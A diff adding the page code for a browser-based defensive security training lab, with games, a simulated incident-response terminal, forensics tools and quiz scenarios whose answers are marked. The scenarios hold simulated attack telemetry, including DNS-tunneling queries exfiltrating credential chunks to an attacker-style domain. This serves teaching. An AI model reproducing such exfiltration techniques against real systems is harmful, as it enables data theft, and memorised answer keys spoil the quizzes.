+.tools-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(420px, 1fr));
+  gap: 24px;
+}
+.tool-box {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 12px;
+  padding: 22px;
+  box-shadow: var(--card-shadow);
+}
+.tool-title {
+  font-family: var(--font-display);
+  font-size: 1.4rem;
+  font-weight: 800;
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.tool-form-group {
+  margin-bottom: 14px;
+}
+.tool-form-group label {
+  display: block;
+  font-family: var(--font-mono);
+  font-size: 0.72rem;
+  text-transform: uppercase;
+  color: var(--text-sub);
+  margin-bottom: 6px;
+}
+.tool-form-group input, .tool-form-group textarea, .tool-form-group select {
+  width: 100%;
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 10px;
+  color: var(--text-main);
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+}
+.tool-form-group textarea {
+  min-height: 80px;
+  resize: vertical;
+}
+.tool-form-group input:focus, .tool-form-group textarea:focus {
+  outline: none;
+  border-color: var(--primary);
+}
+.tool-btns-row {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 14px;
+}
+.btn-tool {
+  flex: 1;
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  color: var(--text-main);
+  padding: 8px 12px;
+  border-radius: 6px;
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.btn-tool:hover {
+  background: var(--primary);
+  color: #040711;
+  border-color: var(--primary);
+  font-weight: 700;
+}
+.tool-output {
+  background: var(--terminal-bg);
+  border: 1px solid var(--border-color);
+  border-radius: 6px;
+  padding: 12px;
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--primary);
+  min-height: 48px;
+  word-break: break-all;
+  user-select: all;
+}
+
+/* ============ VIEW 5: AGENT DOSSIER ============ */
+.dossier-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-color);
+  border-radius: 14px;
+  padding: 28px;
+  box-shadow: var(--card-shadow);
+  margin-bottom: 30px;
+}
+.badges-collection-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 16px;
+  margin-top: 16px;
+}
+.badge-item {
+  background: var(--bg-surface-elevated);
+  border: 1px solid var(--border-color);
+  border-radius: 10px;
+  padding: 18px 14px;
+  text-align: center;
+  transition: all 0.2s;
+  opacity: 0.45;
+  filter: grayscale(1);
+}
+.badge-item.unlocked {
+  opacity: 1;
+  filter: none;
+  border-color: var(--primary);
+  background: var(--primary-subtle);
+}
+.badge-icon {
+  font-size: 2.2rem;
+  margin-bottom: 8px;
+}
+.badge-name {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--text-main);
+}
+.badge-status {
+  font-size: 0.68rem;
+  color: var(--text-sub);
+  margin-top: 4px;
+}
+.badge-item.unlocked .badge-status {
+  color: var(--success);
+  font-weight: 700;
+}
+
+/* Responsive adjustments */
+@media (max-width: 768px) {
+  header.lab-header { padding: 10px 16px; }
+  .header-container { gap: 10px; }
+  .player-status-strip { display: none; }
+  .scenarios-grid { grid-template-columns: 1fr; }
+  .tools-grid { grid-template-columns: 1fr; }
+  .firewall-controls-bar { flex-direction: column; }
+}
+</style>
+</head>
+<body data-theme="dark">
+
+<!-- HEADER BAR -->
+<header class="lab-header">
+  <div class="header-container">
+    <a href="index.html" class="brand-group" aria-label="VUNVAULT Security Lab Home">
+      <div class="brand-badge">
+        <svg viewBox="244 187 1500 1500" fill="#56aeff">
+          <polygon points="355,620 797,1278 965,1027 915,956 797,1133 453,621"/>
+          <polygon points="1632,596 1150,605 1014,808 1061,882 1194,685 1479,680 1181,1125 835,611 737,613 1181,1270"/>
+        </svg>
+      </div>
+      <div class="brand-titles">
+        <span class="brand-title">VUNVAULT</span>
+        <span class="brand-tag">SECURITY LAB · V3.0</span>
+      </div>
+    </a>
+
+    <!-- Player Stats Header Pill -->
+    <div class="player-status-strip">
+      <div class="status-pill">
+        <span class="label">Agent:</span>
+        <span class="val" id="playerCallsign">OPERATOR-9</span>
+      </div>
+      <div class="status-pill">
+        <span class="label">Rank:</span>
+        <span class="rank-badge" id="playerRank">TIER 1 ANALYST</span>
+      </div>
+      <div class="status-pill">
+        <span class="label">XP:</span>
+        <span class="val" id="playerXPText">150 / 1000</span>
+        <div class="xp-track">
+          <div class="xp-fill" id="playerXPBar" style="width: 15%"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Actions: Theme, Audio, Back -->
+    <div class="header-actions">
+      <button class="btn-icon" id="audioToggleBtn" title="Toggle Sound FX" aria-label="Toggle Sound">
+        🔊
+      </button>
+      <button class="btn-icon" id="themeToggleBtn" title="Toggle Dark/Light Mode" aria-label="Toggle Theme">
+        🌙
+      </button>
+      <a href="index.html" class="btn-back" id="backToHomeBtn">
+        <span>←</span> <span>Back to Site</span>
+      </a>
+    </div>
+  </div>
+</header>
+
+<!-- HERO TICKER -->
+<section class="lab-hero">
+  <div class="lab-hero-inner">
+    <div class="hero-meta-row">
+      <div class="live-beacon">
+        <i></i> <span>LIVE THREAT RADAR ACTIVE · ZERO-DAY DEFENSE RANGE</span>
+      </div>
+      <div style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-sub);">
+        SUB-NET MONITOR: <span style="color:var(--success);">VUN-SOC-KE-01</span> · DEFENSE INTEGRITY: <span id="defenseIntegrity">98.4%</span>
+      </div>
+    </div>
+    
+    <div class="lab-title-row">
+      <h1>Active Cyber Defense <span>Simulation Lab</span></h1>
+      <p class="lab-desc">
+        Harden enterprise infrastructure against active persistent threats. Investigate realistic raw packet captures, decode obfuscated exploits, defend against live packet floods, and execute tactical incident response commands.
+      </p>
+    </div>
+
+    <!-- Quick Stats Bar -->
+    <div class="metrics-grid">
+      <div class="metric-card danger">
+        <div class="metric-label">Active Threat Incursions</div>
+        <div class="metric-val" id="statThreats">3 CRITICAL</div>
+        <div class="metric-note">Unmitigated perimeter incursions</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-label">Scenarios Defended</div>
+        <div class="metric-val" id="statCompleted">0 / 9</div>
+        <div class="metric-note">Multi-tier incident investigations</div>
+      </div>
+      <div class="metric-card success">
+        <div class="metric-label">Firewall Interceptions</div>
+        <div class="metric-val" id="statInterceptions">0 PKTS</div>
+        <div class="metric-note">Malicious payloads dropped</div>
+      </div>
+      <div class="metric-card warning">
+        <div class="metric-label">Combat Clearance</div>
+        <div class="metric-val" id="statClearance">LEVEL 1</div>
+        <div class="metric-note">SOC Analyst Readiness Score</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PRIMARY TABS NAVIGATION -->
+<nav class="tabs-nav-bar">
+  <div class="tabs-container">
+    <button class="tab-btn active" data-tab="tab-scenarios">
+      🛡️ <span>Threat Scenarios</span> <span class="badge-count" id="badgeScenariosCount">9</span>
+    </button>
+    <button class="tab-btn" data-tab="tab-arcade">
+      🎮 <span>Arcade Games</span> <span class="badge-count">3</span>
+    </button>
+    <button class="tab-btn" data-tab="tab-terminal">
+      💻 <span>Terminal CTF</span> <span class="badge-count">LIVE</span>
+    </button>
+    <button class="tab-btn" data-tab="tab-toolkit">
+      🧰 <span>Forensics Toolkit</span>
+    </button>
+    <button class="tab-btn" data-tab="tab-dossier">
+      🏆 <span>Agent Dossier & Badges</span>
+    </button>
+  </div>
+</nav>
+
+<!-- MAIN VIEW CONTENT -->
+<main class="lab-main">
+
+  <!-- ==============================================
+       TAB 1: THREAT SCENARIOS (DEFENSE RANGE)
+       ============================================== -->
+  <section id="tab-scenarios" class="tab-view active">
+    <div class="range-controls">
+      <div class="filter-pills">
+        <button class="filter-pill active" data-filter="all">All Tiers (9)</button>
+        <button class="filter-pill" data-filter="t1">Tier 1: Perimeter Recon</button>
+        <button class="filter-pill" data-filter="t2">Tier 2: Application Exploits</button>
+        <button class="filter-pill" data-filter="t3">Tier 3: APT & Ransomware</button>
+      </div>
+      <div class="range-search">
+        <svg viewBox="0 0 24 24"><path d="M10 2a8 8 0 015.293 14.707l4.5 4.5a1 1 0 01-1.414 1.414l-4.5-4.5A8 8 0 1110 2zm0 2a6 6 0 100 12 6 6 0 000-12z"/></svg>
+        <input type="text" id="scenarioSearchInput" placeholder="Search scenarios, CVEs, tools...">
+      </div>
+    </div>
+
+    <div class="scenarios-grid" id="scenariosContainer">
+      <!-- Generated via JS -->
+    </div>
+  </section>
+
+  <!-- ==============================================
+       TAB 2: ARCADE GAMES
+       ============================================== -->
+  <section id="tab-arcade" class="tab-view">
+    <div class="games-hub-grid">
+      
+      <!-- Card Game 1 -->
+      <div class="game-card-entry">
+        <div class="game-icon-strip">🛡️</div>
+        <h3 class="game-entry-title">FIREWALL SENTINEL</h3>
+        <p class="game-entry-desc">
+          Live real-time packet stream defense! Inspect incoming packets on the WAN gateway. Block malicious SYN floods, SQLi probes, and Tor botnet traffic before they breach internal subnet servers.
+        </p>
+        <button class="btn-play-game" onclick="launchGame('firewall')">
+          <span>START PACKET DEFENSE</span> <span>→</span>
+        </button>
+      </div>
+
+      <!-- Card Game 2 -->
+      <div class="game-card-entry">
+        <div class="game-icon-strip">🔐</div>
+        <h3 class="game-entry-title">HASH & CIPHER BREAKER</h3>
+        <p class="game-entry-desc">
+          Race against time to decrypt intercepted C2 communications! Crack Caesar / ROT shifts, reverse multi-layer Base64 malware payloads, and identify obfuscated hash digests.
+        </p>
+        <button class="btn-play-game" onclick="launchGame('crypto')">
+          <span>START CRYPTO PUZZLE</span> <span>→</span>
+        </button>
+      </div>
+
+      <!-- Card Game 3 -->
+      <div class="game-card-entry">
+        <div class="game-icon-strip">⚡</div>
+        <h3 class="game-entry-title">SUBNET CONTAINMENT SPRINT</h3>
+        <p class="game-entry-desc">
+          A ransomware payload is traversing VLAN interfaces! Quickly calculate CIDR subnets, broadcast ranges, and isolate compromised IP blocks before the infection spreads across production.
+        </p>
+        <button class="btn-play-game" onclick="launchGame('subnet')">
+          <span>LAUNCH CONTAINMENT</span> <span>→</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- ACTIVE GAME 1 STAGE: FIREWALL SENTINEL -->
+    <div id="game-stage-firewall" class="active-game-stage">
+      <div class="game-stage-header">
+        <div class="game-stage-title">
+          <span>🛡️ FIREWALL SENTINEL: ACTIVE TRAFFIC GATEWAY</span>
+        </div>
+        <div class="game-stats-bar">
+          <div class="game-stats-item">Score: <b id="fwScore">0</b></div>
+          <div class="game-stats-item">Combo: <b id="fwCombo">x1</b></div>
+          <div class="game-stats-item">Shields: <b id="fwShields">❤️❤️❤️</b></div>
+          <button class="btn-tool" onclick="closeGameStage('firewall')">✕ Exit Game</button>
+        </div>
+      </div>
+
+      <div class="firewall-arena">
+        <div class="arena-zones">
+          <span class="arena-zone-wan">▲ UNTRUSTED WAN TRAFFIC INCOMING</span>
+          <span class="arena-zone-lan">PROTECTED LAN GATEWAY [10.0.0.0/8] ▼</span>
+        </div>
+
+        <div class="packets-flow-container" id="packetArena">
+          <!-- Active packet card injected here -->
+        </div>
+
+        <div class="firewall-controls-bar">
+          <button class="btn-drop-packet" id="btnDropPkt" onclick="playerDecidePacket(false)">
+            <span>⛔ DROP PACKET (D / SPACE)</span>
+          </button>
+          <button class="btn-allow-packet" id="btnAllowPkt" onclick="playerDecidePacket(true)">
+            <span>✅ ACCEPT TRAFFIC (A / ENTER)</span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ACTIVE GAME 2 STAGE: HASH & CIPHER BREAKER -->
+    <div id="game-stage-crypto" class="active-game-stage">
+      <div class="game-stage-header">
+        <div class="game-stage-title">
+          <span>🔐 CIPHER BREAKER: C2 DECRYPTION MATRIX</span>
+        </div>
+        <div class="game-stats-bar">
+          <div class="game-stats-item">Stage: <b id="cryptoStageNum">1 / 4</b></div>
+          <div class="game-stats-item">Crypto XP: <b id="cryptoXP">0</b></div>
+          <button class="btn-tool" onclick="closeGameStage('crypto')">✕ Exit Game</button>
+        </div>
+      </div>
+
+      <div class="crypto-challenge-box" id="cryptoStageBox">
+        <!-- Injected via JS -->
+      </div>
+    </div>
+
+    <!-- ACTIVE GAME 3 STAGE: SUBNET CONTAINMENT SPRINT -->
+    <div id="game-stage-subnet" class="active-game-stage">
+      <div class="game-stage-header">
+        <div class="game-stage-title">
+          <span>⚡ SUBNET CONTAINMENT SPRINT</span>
+        </div>
+        <div class="game-stats-bar">
+          <div class="game-stats-item">Round: <b id="subnetRound">1 / 5</b></div>
+          <div class="game-stats-item">Score: <b id="subnetScore">0</b></div>
+          <button class="btn-tool" onclick="closeGameStage('subnet')">✕ Exit Game</button>
+        </div>
+      </div>
+
+      <div class="crypto-challenge-box" id="subnetChallengeBox">
+        <!-- Injected via JS -->
+      </div>
+    </div>
+  </section>
+
+  <!-- ==============================================
+       TAB 3: TERMINAL CTF SIMULATOR
+       ============================================== -->
+  <section id="tab-terminal" class="tab-view">
+    <div class="terminal-window">
+      <div class="terminal-header-bar">
+        <div class="window-dots">
+          <div class="window-dot"></div>
+          <div class="window-dot"></div>
+          <div class="window-dot"></div>
+        </div>
+        <div class="terminal-tabs">
+          <span>vunvault-ir-shell — bash — 80x24</span>
+        </div>
+        <button class="btn-tool" style="padding: 2px 8px; font-size: 0.7rem;" onclick="terminalClear()">Clear</button>
+      </div>
+
+      <div class="terminal-screen" id="termScreen">
+        <div class="term-line info">═════════════════════════════════════════════════════════════════════════════</div>
+        <div class="term-line info">  VUNVAULT TACTICAL INCIDENT RESPONSE TERMINAL · HOST: soc-compromised-01</div>
+        <div class="term-line info">  AUTHORIZED ACCESS ONLY · TYPE 'help' OR 'objectives' TO PROCEED</div>
+        <div class="term-line info">═════════════════════════════════════════════════════════════════════════════</div>
+        <div class="term-line output">System uptime: 14 days, load avg: 4.82, 3.19, 2.01</div>
+        <div class="term-line output">ALERT: High outbound traffic spike detected on unassigned port 31337!</div>
+        <div class="term-line output">Type commands below to investigate and neutralize the breach.</div>
+      </div>
+
+      <div class="term-input-row">
+        <span class="term-prompt">agent@vunvault-defense:~$</span>
+        <input type="text" class="term-input" id="termInput" placeholder="Type help, ps aux, netstat, grep, iptables, submit..." autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+
+    <!-- Mission Objectives Tracking -->
+    <div class="term-missions-panel">
+      <h3 style="font-family: var(--font-display); font-size: 1.4rem; font-weight: 800;">
+        ACTIVE IR MISSION: PROJECT "SHADOW BEACON"
+      </h3>
+      <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 4px;">
+        An unauthorized persistence script has established an encrypted reverse shell. Complete the tactical tasks below in the terminal:
+      </p>
+      
+      <div class="mission-steps">
+        <div class="mission-step" id="mstep-1">
+          <div class="step-check">1</div>
+          <span>Identify malicious process PID listening on the high port (use: <code>ps aux</code> or <code>netstat</code>)</span>
+        </div>
+        <div class="mission-step" id="mstep-2">
+          <div class="step-check">2</div>
+          <span>Inspect the attacker's staging directory or cron job (use: <code>ls /tmp</code> or <code>cat /etc/crontab</code>)</span>
+        </div>
+        <div class="mission-step" id="mstep-3">
+          <div class="step-check">3</div>
+          <span>Block the rogue C2 IP using firewall rule (use: <code>iptables -A INPUT -s 185.220.101.5 -j DROP</code>)</span>
+        </div>
+        <div class="mission-step" id="mstep-4">
+          <div class="step-check">4</div>
+          <span>Terminate the malicious PID and submit root flag (use: <code>kill 31337</code> then <code>submit VUNVAULT{flag}</code>)</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==============================================
+       TAB 4: FORENSICS TOOLKIT
+       ============================================== -->
+  <section id="tab-toolkit" class="tab-view">
+    <div class="tools-grid">
+      
+      <!-- Tool 1: Base64 / Hex / URL Decoder -->
+      <div class="tool-box">
+        <h3 class="tool-title">⚡ Payload Decoder / Encoder</h3>
+        <div class="tool-form-group">
+          <label>Raw Payload Input</label>
+          <textarea id="toolInputText" placeholder="Paste encoded payload (Base64, Hex, URL, Binary)..."></textarea>
+        </div>
+        <div class="tool-btns-row">
+          <button class="btn-tool" onclick="runDecoder('b64d')">B64 Decode</button>
+          <button class="btn-tool" onclick="runDecoder('b64e')">B64 Encode</button>
+          <button class="btn-tool" onclick="runDecoder('hexd')">Hex to ASCII</button>
+          <button class="btn-tool" onclick="runDecoder('urld')">URL Decode</button>
+          <button class="btn-tool" onclick="runDecoder('rot13')">ROT13</button>
+        </div>
+        <div class="tool-form-group">
+          <label>Decoded Output</label>
+          <div class="tool-output" id="toolOutputResult">Results will display here...</div>
+        </div>
+      </div>
+
+      <!-- Tool 2: Subnet & CIDR Calculator -->
+      <div class="tool-box">
+        <h3 class="tool-title">🌐 Subnet & CIDR Mask Calculator</h3>
+        <div style="display:flex; gap:10px;">
+          <div class="tool-form-group" style="flex:2;">
+            <label>IP Address</label>
+            <input type="text" id="calcIp" value="192.168.10.45">
+          </div>
+          <div class="tool-form-group" style="flex:1;">
+            <label>CIDR Mask (/) </label>
+            <input type="number" id="calcCidr" value="26" min="8" max="32">
+          </div>
+        </div>
+        <button class="btn-tool" style="width:100%; margin-bottom:14px; background:var(--primary); color:#040711; font-weight:700;" onclick="calculateSubnet()">
+          CALCULATE NETWORK BOUNDARIES
+        </button>
+        <div class="tool-output" id="calcSubnetResult" style="white-space: pre-line;">
+Network Address: 192.168.10.0
+Broadcast: 192.168.10.63
+Usable Range: 192.168.10.1 - 192.168.10.62
+Usable Hosts: 62
+Subnet Mask: 255.255.255.192
+        </div>
+      </div>
+
+      <!-- Tool 3: Hash Algorithm Identifier -->
+      <div class="tool-box">
+        <h3 class="tool-title">🔍 Hash Digest Identifier</h3>
+        <div class="tool-form-group">
+          <label>Hash Digest String</label>
+          <input type="text" id="hashDetectInput" placeholder="Paste hash (e.g. 5f4dcc3b5aa765d61d8327deb882cf99)...">
+        </div>
+        <button class="btn-tool" style="width:100%; margin-bottom:14px;" onclick="detectHashType()">
+          ANALYZE DIGEST ENTROPY & FORMAT
+        </button>
+        <div class="tool-output" id="hashDetectResult">
+          Enter a hash above to identify candidate algorithms (MD5, SHA1, SHA256, NTLM, bcrypt).
+        </div>
+      </div>
+
+      <!-- Tool 4: Threat Port & Service Directory -->
+      <div class="tool-box">
+        <h3 class="tool-title">🎯 High-Risk Port & Service Directory</h3>
+        <div class="tool-form-group">
+          <label>Search Port or Service</label>
+          <input type="text" id="portSearchInput" placeholder="Search: 445, 3389, smb, kerberos, ldap..." oninput="filterPorts()">
+        </div>
+        <div class="tool-output" id="portResultsList" style="max-height: 160px; overflow-y: auto;">
+          <!-- Injected via JS -->
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ==============================================
+       TAB 5: AGENT DOSSIER & BADGES
+       ============================================== -->
+  <section id="tab-dossier" class="tab-view">
+    <div class="dossier-card">
+      <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:16px;">
+        <div>
+          <span style="font-family:var(--font-mono); font-size:0.75rem; color:var(--primary); text-transform:uppercase; letter-spacing:0.15em;">OFFICIAL RECORD</span>
+          <h2 style="font-family:var(--font-display); font-size:2.4rem; font-weight:900; line-height:1;">DEFENSE AGENT DOSSIER</h2>
+          <p style="color:var(--text-muted); font-size:0.9rem; margin-top:4px;">Callsign: <b id="dossierCallsign" style="color:var(--text-main);">OPERATOR-9</b> · Security ID: <b style="color:var(--primary);">VV-LAB-2026-X81</b></p>
+        </div>
+        <div>
+          <button class="btn-tool" onclick="resetProgressPrompt()" style="color:var(--danger);">⚠️ Reset Lab Progress</button>
+        </div>
+      </div>
+
+      <!-- Badges Grid -->
+      <h3 style="font-family:var(--font-display); font-size:1.4rem; font-weight:800; margin-top:30px;">EARNED SPECIALIZATION BADGES</h3>
+      <div class="badges-collection-grid" id="badgesContainer">
+        <!-- Injected via JS -->
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- INVESTIGATION MODAL -->
+<div class="modal-backdrop" id="scenarioModal">
+  <div class="investigation-window">
+    <div class="window-topbar">
+      <div class="window-title-group">
+        <div class="window-dots">
+          <div class="window-dot"></div>
+          <div class="window-dot"></div>
+          <div class="window-dot"></div>
+        </div>
+        <span class="window-title" id="modalScenarioTitle">INCIDENT INVESTIGATION</span>
+      </div>
+      <button class="window-close" onclick="closeScenarioModal()">✕</button>
+    </div>
+    <div class="window-body" id="modalScenarioContent">
+      <!-- Injected dynamically -->
+    </div>
+  </div>
+</div>
+
+<script>
+/* ========================================================
+   VUNVAULT SECURITY LAB — CORE CLIENT ENGINE & SIMULATOR
+   ======================================================== */
+(function() {
+  'use strict';
+
+  // State
+  const STATE = {
+    theme: localStorage.getItem('vv_lab_theme') || 'dark',
+    sound: localStorage.getItem('vv_lab_sound') !== 'false',
+    xp: parseInt(localStorage.getItem('vv_lab_xp') || '150', 10),
+    completedScenarios: JSON.parse(localStorage.getItem('vv_lab_completed') || '[]'),
+    badges: JSON.parse(localStorage.getItem('vv_lab_badges') || '["recruit"]'),
+    fwScore: 0,
+    fwCombo: 1,
+    fwShields: 3,
+    activePacket: null,
+    cryptoStage: 0,
+    termMissionStep: 1
+  };
+
+  /* ============ WEB AUDIO SYNTHESIS (ZERO-NETWORK SFX) ============ */
+  let audioCtx = null;
+  function getAudioContext() {
+    if (!audioCtx && (window.AudioContext || window.webkitAudioContext)) {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    return audioCtx;
+  }
+
+  function playTone(freq, type, duration, gainVal = 0.15) {
+    if (!STATE.sound) return;
+    try {
+      const ctx = getAudioContext();
+      if (!ctx) return;
+      if (ctx.state === 'suspended') ctx.resume();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = type;
+      osc.frequency.setValueAtTime(freq, ctx.currentTime);
+      gain.gain.setValueAtTime(gainVal, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + duration);
+    } catch(e) {}
+  }
+
+  const SFX = {
+    click: () => playTone(800, 'sine', 0.05, 0.08),
+    success: () => {
+      playTone(587.33, 'triangle', 0.1, 0.15);
+      setTimeout(() => playTone(880, 'triangle', 0.25, 0.2), 100);
+    },
+    error: () => {
+      playTone(220, 'sawtooth', 0.18, 0.2);
+      setTimeout(() => playTone(180, 'sawtooth', 0.25, 0.2), 120);
+    },
+    laserDrop: () => {
+      if (!STATE.sound) return;
+      try {
+        const ctx = getAudioContext();
+        if (!ctx) return;
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(950, ctx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(120, ctx.currentTime + 0.18);
+        gain.gain.setValueAtTime(0.2, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.18);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        osc.stop(ctx.currentTime + 0.18);
+      } catch(e) {}
+    },
+    terminalBeep: () => playTone(1200, 'sine', 0.04, 0.05)
+  };
+
+  /* ============ THEME MANAGEMENT ============ */
+  function applyTheme(theme) {
+    STATE.theme = theme;
+    document.body.setAttribute('data-theme', theme);
+    localStorage.setItem('vv_lab_theme', theme);
+    const btn = document.getElementById('themeToggleBtn');
+    if (btn) btn.textContent = theme === 'dark' ? '🌙' : '☀️';
+  }
+
+  document.getElementById('themeToggleBtn').addEventListener('click', () => {
+    applyTheme(STATE.theme === 'dark' ? 'light' : 'dark');
+    SFX.click();
+  });
+
+  // Sound toggle
+  document.getElementById('audioToggleBtn').addEventListener('click', () => {
+    STATE.sound = !STATE.sound;
+    localStorage.setItem('vv_lab_sound', STATE.sound);
+    document.getElementById('audioToggleBtn').textContent = STATE.sound ? '🔊' : '🔇';
+    if (STATE.sound) SFX.click();
+  });
+
+  /* ============ IFRAME ESCAPE & CLOSE BRIDGE ============ */
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+      const modal = document.getElementById('scenarioModal');
+      if (modal && modal.classList.contains('open')) {
+        closeScenarioModal();
+        return;
+      }
+      if (window.parent && window.parent !== window && window.parent.__vvlClose) {
+        try { window.parent.__vvlClose(); } catch(err) {}
+      }
+    }
+  });
+
+  document.getElementById('backToHomeBtn').addEventListener('click', function(e) {
+    if (window.parent && window.parent !== window && window.parent.__vvlClose) {
+      e.preventDefault();
+      try { window.parent.__vvlClose(); } catch(err) {}
+    }
+  });
+
+  /* ============ TABS NAVIGATION ============ */
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-view').forEach(v => v.classList.remove('active'));
+      btn.classList.add('active');
+      const target = document.getElementById(btn.getAttribute('data-tab'));
+      if (target) target.classList.add('active');
+      SFX.click();
+    });
+  });
+
+  /* ============ HARD-TO-CRACK SCENARIOS DATA (9 TIERS) ============ */
+  const SCENARIOS = [
+    {
+      id: "sc-01",
+      tier: "t1",
+      tierLabel: "Tier 1: Perimeter",
+      severity: "critical",
+      title: "ARP Poisoning & Rogue Gateway Incursion",
+      desc: "Workstations in the accounting subnet report intermittent SSL certificate warnings. Wireshark telemetry reveals unexpected gratuitous ARP replies mapping the default gateway MAC address.",
+      skills: ["Wireshark", "ARP Cache", "Ebtables", "Subnet 10.10.20.0/24"],
+      xp: 250,
+      brief: "Accounting hosts (10.10.20.15 - 10.10.20.40) communicate through Gateway 10.10.20.1 (Legitimate Hardware MAC: 00:50:56:fd:e8:11). At 14:02 UTC, host 10.10.20.88 broadcasted gratuitous ARPs asserting that 10.10.20.1 is at rogue MAC 52:54:00:8b:22:fe.",
+      telemetry: `14:02:18.104291 ARP, Reply 10.10.20.1 is-at 52:54:00:8b:22:fe, length 46
+14:02:18.305190 ARP, Reply 10.10.20.1 is-at 52:54:00:8b:22:fe, length 46
+14:02:18.910245 IP 10.10.20.15.54322 > 10.10.20.88.443: Flags [S], seq 3891023
+14:02:19.001923 IP 10.10.20.88.443 > 10.10.20.15.54322: Flags [SA], Rogue Self-Signed Cert: CN=vunvault-internal-mitm`,
+      question: "Which MAC address is the malicious rogue interceptor, and what is the immediate switchport remediation?",
+      type: "radio",
+      options: [
+        { id: "a", text: "MAC 00:50:56:fd:e8:11; reboot core gateway router" },
+        { id: "b", text: "MAC 52:54:00:8b:22:fe; enable Dynamic ARP Inspection (DAI) & isolate port of 10.10.20.88", correct: true },
+        { id: "c", text: "MAC 10:10:20:15; flush local DNS cache on client workstations" },
+        { id: "d", text: "MAC ff:ff:ff:ff:ff:ff; deploy additional DHCP relay agents" }
+      ],
+      flagRequirement: null,
+      explanation: "Attacker host 10.10.20.88 spoofed the default gateway using MAC 52:54:00:8b:22:fe. Dynamic ARP Inspection (DAI) bound to DHCP Snooping verifies ARP packets against the snooping database, instantly dropping malicious gratuitous replies."
+    },
+    {
+      id: "sc-02",
+      tier: "t1",
+      tierLabel: "Tier 1: Perimeter",
+      severity: "high",
+      title: "Stealth SYN / Xmas Port Scan Triage",
+      desc: "Suricata IDS alerts trigger on external IP 45.33.32.156 sending TCP packets with flags [FIN, PSH, URG] across edge firewalls. Identify the vulnerable exposed service.",
+      skills: ["TCP Flags", "Nmap Decoy", "iptables", "Port Security"],
+      xp: 220,
+      brief: "An external adversary is probing enterprise DMZ boundaries using non-standard TCP flag combinations designed to bypass simple stateful firewalls that only look for SYN packets.",
+      telemetry: `[ALERT] 10/Sep/2026 03:14:02 - ET SCAN Nmap Xmas Scan [FIN,PSH,URG]
+Src: 45.33.32.156:52941 -> Dst: 196.201.214.12:8089 [OPEN]
+TCP Response: [RST, ACK] on 8088, 8090; [SYN, ACK] on 8089 (Custom Java RMI Broker)
+Payload probe: 0x4a524d4900024b (JRMI Header detected)`,
+      question: "What service is running on the exposed open port, and what rule completely blocks the scanning IP in iptables?",
+      type: "radio",
+      options: [
+        { id: "a", text: "Port 80; iptables -A INPUT -p tcp --dport 80 -j ACCEPT" },
+        { id: "b", text: "Port 8089 (Java RMI Broker); iptables -A INPUT -s 45.33.32.156 -j DROP", correct: true },
+        { id: "c", text: "Port 53 (DNS); iptables -t nat -A PREROUTING -j DROP" },
+        { id: "d", text: "Port 8088; iptables -F FORWARD" }
+      ],
+      flagRequirement: null,
+      explanation: "Port 8089 returned a SYN-ACK with Java RMI header (0x4a524d49). Java RMI is extremely dangerous to expose publicly as it is prone to deserialization RCE. Blocking 45.33.32.156 with -j DROP immediately neutralizes the recon phase."
+    },
+    {
+      id: "sc-03",
+      tier: "t1",
+      tierLabel: "Tier 1: Perimeter",
+      severity: "critical",
+      title: "DNS Tunneling & Data Exfiltration Carving",
+      desc: "Excessive high-entropy TXT and A queries to strange subdomain trees under '.ns-update.xyz'. Reconstruct the exfiltrated sensitive asset chunk.",
+      skills: ["DNS Tunnel", "Base32 / Hex", "Entropy Analysis", "C2 Channel"],
+      xp: 300,
+      brief: "The edge internal DNS resolver (10.0.1.2) forwarded 1,840 queries over 30 minutes to an authoritative nameserver controlled by the attacker. Subdomain strings show base32 chunks.",
+      telemetry: `QUERY: dGVzdC1jcmVkcwo.chunk01.ns-update.xyz -> TXT
+QUERY: MjAyNl9zdGFmZl9w.chunk02.ns-update.xyz -> TXT
+QUERY: YXNzd29yZHNfdjE.chunk03.ns-update.xyz -> TXT
+QUERY: Cg==.chunk04.ns-update.xyz -> TXT
+Combined Base64 string: dGVzdC1jcmVkcwoMjAyNl9zdGFmZl9wYXNzd29yZHNfdjEK`,
